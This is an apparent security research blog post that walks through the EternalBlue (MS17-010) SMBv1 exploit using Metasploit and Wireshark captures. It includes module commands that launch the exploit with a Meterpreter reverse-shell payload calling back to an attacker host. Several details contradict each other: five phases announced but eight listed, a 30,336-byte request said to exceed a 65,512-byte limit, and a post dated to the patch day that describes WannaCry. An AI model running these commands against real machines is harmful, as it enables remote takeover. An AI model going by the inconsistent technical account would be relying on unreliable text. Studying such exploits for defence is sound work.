---
title: "MS17-010 (EternalBlue): SMBv1 Exploit Analysis"
date: 2017-03-14
description: "Analysis of MS17-010 EternalBlue — SMBv1 buffer overflow exploit used by WannaCry and NotPetya, with Metasploit module dissection"
tags: ["MS17-010", "EternalBlue", "SMB", "Windows", "exploit", "Metasploit", "WannaCry"]
categories: ["Research"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## Overview

MS17-010, also known as EternalBlue, is a critical Remote Code Execution vulnerability in the Windows SMBv1 protocol. It was weaponized in the NSA's EternalBlue exploit, later leaked by the Shadow Brokers, and became the propagation engine behind WannaCry and NotPetya ransomware campaigns.

This post documents a packet-level analysis of the Metasploit `exploit/windows/smb/ms17_010_eternalblue` module running against a vulnerable Windows target.

---

## Vulnerability Background

SMB (Server Message Block) is the Windows file-sharing protocol. When a client sends a `Trans` request larger than the server's `MaxBufferSize` (65,512 bytes), the remaining data is sent as a follow-up `Trans2` request. The vulnerability is triggered during the handling of these secondary `Trans2` packets.

When Windows directory sharing is enabled over the network, the first precondition for exploitation is automatically satisfied — the IPC$ share is exposed and the Trans/Trans2 path is reachable unauthenticated.

**Affected systems**: Windows Vista, 7, 8.1, 10, Server 2003–2016 (unpatched)
**Patch**: [MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) (March 14, 2017)

---

## Environment Setup

- **Attacker**: Kali Linux with Metasploit Framework
- **Target**: Windows 7 x64 with SMBv1 enabled, network directory sharing active, password-protected sharing disabled

> Password-protected sharing must be disabled for the exploit precondition (authenticated SMB session) to be bypassed in this lab configuration.

---

## Metasploit Module

Searching in Metasploit surfaces two relevant modules:

```
msf > search ms17-010

   Name                                      Rank
   ----                                      ----
   auxiliary/scanner/smb/smb_ms17_010       normal   (Vulnerability Scanner)
   exploit/windows/smb/ms17_010_eternalblue  average  (EternalBlue Exploit)
```

Running the scanner against the target confirms the vulnerability:

```
[+] 192.168.x.x:445 - Host is likely VULNERABLE to MS17-010!
```

Setting up the exploit:

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <victim_ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker_ip>
run
```

---

## Packet Analysis

The exploit traffic was captured with Wireshark (UDP filtered out). The full exchange breaks down into five phases.

### Phase 1 — TCP Three-Way Handshake

Standard TCP SYN / SYN-ACK / ACK to port 445. Interestingly, an SMB request/response exchange occurs inside the handshake window before the final ACK that establishes the connection — an artifact of how the Windows SMB stack pre-negotiates during connection setup.

### Phase 2 — SMB Negotiation

After the TCP handshake, the client sends an `SMB_COM_NEGOTIATE` request listing the SMB dialects it supports. The server responds with its selected dialect and capabilities, including the `MaxBufferSize` field that the exploit later abuses.

### Phase 3 — Session Setup (NTLM Authentication)

The client and server perform an NTLM authentication exchange embedded within SMB `Session Setup AndX` packets.

NTLM uses a Challenge-Response mechanism:

1. Client sends `NTLMSSP_NEGOTIATE`
2. Server replies with `NTLMSSP_CHALLENGE` (random nonce used as a salt)
3. Client computes a response using the password hash and the challenge, sends `NTLMSSP_AUTH`

In the EternalBlue exploit, this authentication step uses a null session (anonymous logon) to reach the vulnerable Trans code path.

### Phase 4 — Tree Connect and Trans Overflow

After authentication, the client issues a `Tree Connect AndX` to connect to the IPC$ share, providing the UNC path. The server responds with the service name (`IPC`).

The exploit then sends a large `NT Trans` request (30,336 bytes) — deliberately exceeding `MaxBufferSize`. The kernel SMB handler, `srv.sys`, allocates a buffer based on the size fields in the initial Trans header and then processes the secondary Trans2 continuation. The vulnerability is a pool buffer overflow in this secondary processing path: the `TotalDataCount` field in the Trans header controls the size of the allocation, while the actual data written can exceed it.

### Phase 5 — SMB Echo Probing

After the initial overflow, the exploit sends a series of `SMB Echo` requests with payload `0x41414141...`. This probing phase:

1. Detects whether the overflow corrupted the right pool region
2. Receives OS version information in the echo responses (used to select the correct shellcode offsets)

![SMB Echo probe with 0x41 pattern](/images/blog/ms17-010-analysis/Image.png)

### Phase 6 — Second Negotiate + Shellcode Delivery

A second `SMB Negotiate` exchange begins. The server's response leaks OS build information, which the module uses to locate the kernel pool spray targets.

The second `NT Trans2` packet contains the actual shellcode payload.

### Phase 7 — TCP RST Flood on Port 445

A burst of `TCP [RST, ACK]` packets to port 445 follows. This is the exploit's mechanism for grooming the kernel pool — the RST storm frees and reallocates pool chunks to position the shellcode at a predictable address before triggering the overwrite.

### Phase 8 — Push / Shell

The client sends a `TCP PSH` packet. Inspection of the payload shows a Windows shellcode stub that spawns `cmd.exe`. Shortly after, the connection transitions to a `BROWSER` state (NetBIOS Browser service), indicating the reverse shell has been established and the attacker machine is issuing commands.

---

## Exploit Flow Summary

```
TCP Handshake (port 445)
    ↓
SMB Negotiate (dialect selection)
    ↓
Session Setup + NTLM (null session)
    ↓
Tree Connect → IPC$
    ↓
NT Trans (30336 bytes) → MaxBufferSize overflow → pool corruption in srv.sys
    ↓
SMB Echo probe (0x41 * N) → OS fingerprint via response
    ↓
Second SMB Negotiate → build/version leak
    ↓
NT Trans2 → shellcode delivery
    ↓
TCP RST flood → kernel pool grooming
    ↓
TCP PSH → shellcode trigger → cmd.exe / Meterpreter
    ↓
BROWSER state → RCE established
```

---

## Key Technical Points

| Detail | Value |
|---|---|
| Protocol | SMBv1 over TCP port 445 |
| Overflow location | `srv.sys` kernel pool (NT Trans / Trans2 handler) |
| MaxBufferSize threshold | 65,512 bytes |
| Overflow trigger | `TotalDataCount` / secondary Trans2 size mismatch |
| Pool grooming | TCP RST flood on port 445 |
| Authentication required | None (null session via IPC$) |
| Payload | Position-independent shellcode → Meterpreter |

---

## References

1. [Microsoft Windows - Unauthenticated SMB Remote Code Execution Scanner (MS17-010) — Exploit-DB](https://www.exploit-db.com/exploits/41891/)
2. [FireEye — SMB Exploited: WannaCry Use of EternalBlue](https://www.fireeye.kr/company/press-releases/2017/smb-exploited-wannacry-use-of-eternalblue.html)
3. [WannaCry Ransomware Global Spread — NpCore](http://www.npcore.com/notice/?uid=177&mod=document#top)
4. [SMB, I Choose You! PART 01 — BPsec Blog](https://bpsecblog.wordpress.com/2017/07/07/kimchicon_smb_part01/)
5. [WannaCry Enterprise Impact — Boannews](http://www.boannews.com/media/view.asp?idx=54731&page=2&kind=1&search=title&find=wannacry)
6. [SMB Protocol Overview](http://oulth.tistory.com/58)
7. [SMB (Server Message Block) — Coffeenix](http://coffeenix.net/doc/network/SMB_ICMP_UDP(huichang).pdf)
